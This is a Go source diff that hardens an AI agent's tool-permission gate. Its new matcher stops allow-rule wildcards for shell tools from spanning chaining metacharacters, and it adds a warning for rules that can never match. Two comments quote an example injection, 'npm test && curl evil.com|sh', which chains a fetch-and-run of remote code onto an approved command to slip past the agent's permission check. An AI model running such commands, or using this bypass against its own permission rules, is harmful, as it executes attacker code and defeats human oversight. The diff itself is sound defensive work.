@@ -42,6 +42,14 @@ type Rule struct {
 	Pattern string // glob; "*" matches any subject
 	raw     string // original text, for audit messages
 	re      *regexp.Regexp
+	// reExec is an alternate compilation of Pattern used for RuleAllow rules
+	// matched against execute-capability tools (P7.3): "*"/"?" cannot span
+	// shell chaining/substitution metacharacters, so a scoping rule like
+	// "allow bash(npm test*)" cannot be bypassed by appending "&& curl
+	// evil.com|sh" to an otherwise-matching command. Deny rules deliberately
+	// keep the broad re: over-matching on a deny is safe, under-matching on
+	// an allow is not.
+	reExec *regexp.Regexp
 }
 
 var ruleSyntax = regexp.MustCompile(`^(allow|deny)\s+([A-Za-z_*][\w*]*)\s*(?:\(\s*(.*?)\s*\))?$`)
@@ -68,6 +76,7 @@ func ParseRule(s string) (Rule, error) {
 		Pattern: pattern,
 		raw:     trimmed,
 		re:      globToRegexp(pattern),
+		reExec:  globToRegexpExec(pattern),
 	}, nil
 }
 
@@ -91,10 +100,15 @@ func ParseRules(lines []string) ([]Rule, error) {
 
 // matches reports whether the rule applies to a tool call. The tool name (and
 // its capability) is matched against the rule's Tool field, and the rule's
-// glob is matched against the subject extracted from the input.
+// glob is matched against the subject extracted from the input. An allow rule
+// scoping an execute-capability tool uses the metachar-restricted reExec
+// instead of re (P7.3), so it cannot be widened by shell chaining.
 func (r Rule) matches(t tool.Tool, subject string) bool {
 	if !ruleToolMatches(r.Tool, t) {
 		return false
+	}
+	if r.Action == RuleAllow && t.Capability() == tool.CapExecute {
+		return r.reExec.MatchString(subject)
 	}
 	return r.re.MatchString(subject)
 }
@@ -120,6 +134,12 @@ func ruleToolMatches(selector string, t tool.Tool) bool {
 	}
 	return false
 }
+
+// subjectFieldNames are the input-field names subjectFor knows how to read. A
+// tool whose schema exposes none of these can never contribute a non-empty
+// subject, so a rule scoping it with anything other than "*" is a silent
+// no-op (P7.7) — see WarnUnmatchableRules.
+var subjectFieldNames = []string{"command", "path", "file_path", "url", "query", "pattern"}
 
 // subjectFor extracts the string a rule's glob matches against, choosing the
 // field most relevant to the tool's capability and falling back to any common
@@ -179,6 +199,42 @@ func globToRegexp(glob string) *regexp.Regexp {
 	b.WriteString("$")
 	// glob patterns are simple enough that compilation cannot fail, but guard
 	// anyway with a never-matching fallback.
+	re, err := regexp.Compile(b.String())
+	if err != nil {
+		return regexp.MustCompile(`$.^`)
+	}
+	return re
+}
+
+// shellMetaClass is the character class excluded from "*"/"?" expansion by
+// globToRegexpExec (P7.3): these are the shell characters that chain,
+// pipe, substitute, or redirect, so letting a wildcard span them lets a
+// scoped allow rule be widened by appending extra commands.
+const shellMetaClass = `;&|` + "`" + `$()<>` + "\n\r"
+
+// globToRegexpExec is globToRegexp's counterpart for allow-rules scoping an
+// execute-capability tool. Unlike globToRegexp's "*" → ".*" (which spans
+// everything, including shell chaining metacharacters), "*"/"?" here cannot
+// match any character in shellMetaClass. This closes the gap where
+// "allow bash(npm test*)" — compiled the ordinary way to "^npm test.*$" —
+// also matches "npm test && curl evil.com|sh", giving a rule meant to narrow
+// auto-approval to one command no real boundary against shell injection.
+// Literal (non-wildcard) characters in the pattern, including metacharacters
+// the rule author wrote explicitly, still match exactly as before.
+func globToRegexpExec(glob string) *regexp.Regexp {
+	var b strings.Builder
+	b.WriteString("^")
+	for _, r := range glob {
+		switch r {
+		case '*':
+			b.WriteString("[^" + shellMetaClass + "]*")
+		case '?':
+			b.WriteString("[^" + shellMetaClass + "]")
+		default:
+			b.WriteString(regexp.QuoteMeta(string(r)))
+		}
+	}
+	b.WriteString("$")
 	re, err := regexp.Compile(b.String())
 	if err != nil {
 		return regexp.MustCompile(`$.^`)
@@ -259,4 +315,52 @@ func (g *RuleGate) emit(t tool.Tool, r Rule, d Decision, reason string) {
 		Decision: d,
 		Reason:   reason,
 	})
+}
+
+// WarnUnmatchableRules flags, via warn, any scoped (non-"*" pattern) rule
+// whose Tool selector matches a registered tool whose declared input schema
+// exposes none of subjectFieldNames (P7.7). subjectFor can only ever return
+// "" for such a tool, so the rule's pattern never matches — a scoped
+// "deny write(/etc/*)"-style rule silently never blocks that tool instead of
+// failing loudly, which is a false sense of security rather than an active
+// exploit. Intended to run once at startup against the full tool registry,
+// not per tool call.
+func WarnUnmatchableRules(rules []Rule, tools []tool.Tool, warn func(msg string, args ...any)) {
+	if warn == nil {
+		return
+	}
+	for _, r := range rules {
+		if r.Pattern == "*" {
+			continue // matches "" trivially; not a no-op
+		}
+		for _, t := range tools {
+			if !ruleToolMatches(r.Tool, t) {
+				continue
+			}
+			if toolHasSubjectField(t) {
+				continue
+			}
+			warn("permission rule can never match this tool and is a silent no-op: its input schema has none of the recognized subject fields",
+				"rule", r.raw, "tool", t.Name(), "capability", string(t.Capability()),
+				"recognized_fields", strings.Join(subjectFieldNames, ", "))
+		}
+	}
+}
+
+// toolHasSubjectField reports whether t's declared input schema exposes at
+// least one of subjectFieldNames. An unparseable schema returns true so a
+// schema we can't introspect never produces a false-positive warning.
+func toolHasSubjectField(t tool.Tool) bool {
+	var schema struct {
+		Properties map[string]json.RawMessage `json:"properties"`
+	}
+	if json.Unmarshal(t.InputSchema(), &schema) != nil {
+		return true
+	}
+	for _, f := range subjectFieldNames {
+		if _, ok := schema.Properties[f]; ok {
+			return true
+		}
+	}
+	return false
 }
